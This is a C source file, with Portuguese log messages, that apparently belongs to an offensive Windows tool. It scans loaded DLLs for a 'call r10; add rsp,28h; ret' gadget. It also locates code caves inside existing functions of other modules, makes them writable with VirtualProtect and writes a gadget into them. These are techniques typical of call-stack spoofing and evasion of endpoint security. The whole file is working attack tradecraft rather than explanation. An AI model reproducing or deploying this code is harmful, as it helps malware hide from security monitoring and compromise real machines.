#include "gadget.h"

#pragma comment(lib, "kernel32.lib")

PVOID FindGadgetInModule(HMODULE hModule) {
    if (!hModule) return NULL;

    PBYTE base = (PBYTE)hModule;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;

    for (DWORD i = 0; (i + 3 + GADGET_MAX_GAP + 5) < imageSize; i++) {

        // 41 FF D2 = call r10
        if (base[i] != 0x41) continue;
        if (base[i + 1] != 0xFF) continue;
        if (base[i + 2] != 0xD2) continue;

        for (int gap = 0; gap < GADGET_MAX_GAP; gap++) {
            DWORD j = i + 3 + gap;
            if ((j + 4) >= imageSize) break;

            // 48 83 C4 28 C3 = add rsp,28h / ret 
            if (base[j] == 0x48 &&
                base[j + 1] == 0x83 &&
                base[j + 2] == 0xC4 &&
                base[j + 3] == 0x28 &&
                base[j + 4] == 0xC3)
            {
                return (PVOID)&base[i];
            }
        }
    }

    return NULL;
}

PVOID FindCallGadget(HMODULE* phGadgetModule) {
    if (phGadgetModule) *phGadgetModule = NULL;

    printf("[*] Buscando gadget em DLLs candidatas...\n");

    for (int i = 0; GADGET_CANDIDATE_DLLS[i] != NULL; i++) {

        HMODULE hMod = GetModuleHandleA(GADGET_CANDIDATE_DLLS[i]);

        if (!hMod) {
            printf("tentando carregar '%s' para buscar gadget...\n", GADGET_CANDIDATE_DLLS[i]);
            hMod = LoadLibraryA(GADGET_CANDIDATE_DLLS[i]);
            getchar();
        }
        else {
            printf("'%s' ja carregada, buscando gadget...\n", GADGET_CANDIDATE_DLLS[i]);
        }

        if (!hMod) continue;

        PVOID gadget = FindGadgetInModule(hMod);
        if (gadget) {
            if (phGadgetModule) *phGadgetModule = hMod;

         #ifdef _DEBUG
            printf("[+] Gadget encontrado em '%s' %p\n", GADGET_CANDIDATE_DLLS[i], gadget);
         #endif

            return gadget;
        }
    }

    return NULL;
}

PVOID FindCodeCave(void) {
    HMODULE hSelf = GetModuleHandle(NULL);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
        GetCurrentProcessId());
    if (hSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] CreateToolhelp32Snapshot falhou: %lu\n", GetLastError());
        return NULL;
    }

    MODULEENTRY32W me = { .dwSize = sizeof(MODULEENTRY32W) };
    PVOID result = NULL;

    if (!Module32FirstW(hSnap, &me)) goto cleanup;

    do {

        if (me.hModule == hSelf) {
            continue;
        }

        char nameA[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, me.szModule, -1, nameA, MAX_PATH, NULL, NULL);

        char* name = strrchr(nameA, '\\');
        name = name ? name + 1 : nameA;

        if (IsExcluded(name)) {
            printf("[~] Pulando modulo excluido: %s\n", name);
            continue;
        }

        printf("[*] Verificando: %s (base: %p)\n", name, (void*)me.hModule);

        PVOID cave = FindCodeCaveInModule(me.hModule);
        if (cave) {
            printf("[+] Code cave encontrado em: %s %p\n", name, cave);
            result = cave;
            break;
        }

    } while (Module32NextW(hSnap, &me));

cleanup:
    CloseHandle(hSnap);
    return result;
}

PVOID WriteGadget(HMODULE* phModule) {
    printf("[*] Buscando code cave de %d bytes dentro de funcao...\n", CAVE_SIZE);

    // Percorre modulos carregados buscando um cave dentro de uma RUNTIME_FUNCTION
    HMODULE hSelf = GetModuleHandle(NULL);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
        GetCurrentProcessId());
    if (hSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] CreateToolhelp32Snapshot falhou: %lu\n", GetLastError());
        return NULL;
    }

    MODULEENTRY32W me = { .dwSize = sizeof(MODULEENTRY32W) };
    PVOID cave = NULL;
    HMODULE hFoundMod = NULL;

    if (!Module32FirstW(hSnap, &me)) { CloseHandle(hSnap); return NULL; }

    do {
        if (me.hModule == hSelf) continue;

        char nameA[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, me.szModule, -1, nameA, MAX_PATH, NULL, NULL);
        char* name = strrchr(nameA, '\\');
        name = name ? name + 1 : nameA;

        if (IsExcluded(name)) continue;

        printf("[*] Verificando funcoes em: %s\n", name);

        cave = FindCodeCaveInFunction(me.hModule);
        if (cave) {
            hFoundMod = me.hModule;
            printf("[+] Code cave encontrado em: %s %p\n", name, cave);
            break;
        }
    } while (Module32NextW(hSnap, &me));

    CloseHandle(hSnap);

    if (!cave) {
        printf("[-] Nenhum code cave em funcao existente encontrado.\n");
        return NULL;
    }

    if (phModule) *phModule = hFoundMod;

    DWORD oldProtect;
    if (!VirtualProtect(cave, CAVE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtect falhou: %lu\n", GetLastError());
        return NULL;
    }

    memcpy(cave, Gadget, CAVE_SIZE);

    VirtualProtect(cave, CAVE_SIZE, oldProtect, &oldProtect);

    printf("[+] Gadget escrito em: %p\n", cave);
    return cave;
}

/*
PVOID WriteGadget(HMODULE* phModule) {
    PVOID result = NULL;
    printf("[*] Buscando code cave de %d bytes...\n", CAVE_SIZE);

    PVOID cave = FindCodeCave();

    if (!cave) {
        printf("[-] Nenhum code cave encontrado.\n");
        return NULL;
    }

    printf("[+] Code cave encontrado em: %p\n", cave);

    if (phModule) {
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(cave, &mbi, sizeof(mbi))) {
            *phModule = (HMODULE)mbi.AllocationBase;
        }
        else {
            *phModule = NULL;
        }
    }

    DWORD oldProtect;
    if (!VirtualProtect(cave, CAVE_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        fprintf(stderr, "[!] VirtualProtect falhou: %lu\n", GetLastError());
        return NULL;
    }

    memcpy(cave, Gadget, CAVE_SIZE);

    VirtualProtect(cave, CAVE_SIZE, oldProtect, &oldProtect);

    printf("[+] Gadget escrito em %p\n", cave);

    return cave;
}
*/